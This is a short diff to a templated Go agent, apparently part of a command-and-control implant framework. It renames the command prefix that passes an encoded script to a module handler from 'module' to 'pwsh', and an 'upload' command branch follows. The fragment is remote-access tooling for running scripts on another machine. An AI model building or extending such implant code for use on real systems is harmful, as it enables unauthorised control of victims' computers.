@@ -1,7 +1,7 @@
 // Core command processing functionality
 func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
-    if strings.HasPrefix(command, "module ") {
-        encodedScript := command[7:] // Remove "module " prefix
+    if strings.HasPrefix(command, "pwsh ") {
+        encodedScript := command[5:] // Remove "pwsh " prefix
         result := a.{AGENT_HANDLE_MODULE_FUNC}(encodedScript)
         return result
     } else if strings.HasPrefix(command, "upload ") {
